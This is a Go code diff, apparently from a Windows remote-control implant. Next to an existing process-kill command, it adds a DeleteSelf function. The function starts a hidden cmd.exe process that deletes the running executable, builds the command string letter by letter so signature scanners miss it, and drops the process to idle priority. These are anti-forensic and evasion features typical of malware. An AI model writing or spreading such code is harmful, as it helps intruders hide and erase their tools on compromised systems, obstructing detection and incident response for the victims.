@@ -647,3 +647,35 @@ func KillProcess(pid uint32) ([]byte, error) {
 	}
 	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
 }
+
+func DeleteSelf() ([]byte, error) {
+	var sI windows.StartupInfo
+	var pI windows.ProcessInformation
+	sI.ShowWindow = windows.SW_HIDE
+
+	filename, err := os.Executable()
+	if err != nil {
+		return nil, err
+	}
+	program, _ := syscall.UTF16PtrFromString("c" + "m" + "d" + "." + "e" + "x" + "e" + " /c" + " d" + "e" + "l " + filename)
+	err = windows.CreateProcess(
+		nil,
+		program,
+		nil,
+		nil,
+		true,
+		windows.CREATE_NO_WINDOW,
+		nil,
+		nil,
+		&sI,
+		&pI)
+	if err != nil {
+		return nil, errors.New("could not delete " + filename + " " + err.Error())
+	}
+	err = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
+	if err != nil {
+		return nil, err
+	}
+	return []byte("success delete"), nil
+
+}
